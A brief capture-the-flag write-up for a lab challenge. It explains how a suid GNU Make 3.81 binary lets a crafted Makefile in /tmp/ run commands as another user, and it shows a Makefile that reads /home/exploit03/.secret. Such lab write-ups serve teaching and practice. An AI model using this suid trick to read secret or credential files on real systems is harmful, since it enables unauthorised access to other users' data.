## Write-up

This task is an exploit task.  
We are given a shell on a remote server.  
The source code is also given. It is make version 3.81-alpha.  
This version is vulnerable to a vulnerability.  
The "intended" way to solve this task will not be described here, because
there was an other vulnerability everyone took advantage of.  
If you are looking for the "correct" way of solving this, check exploit 05.  

There was a suid binary of GNU Make 3.81, that you could use to compile every
Makefile.  
It was therefore possible to run any command from user exploit03 with a  
crafted Makefile dropped in /tmp/:

```Makefile
all:
        @whoami
        @cat /home/exploit03/.secret
```
`/home/exploit03/project/make -f exploit-03`
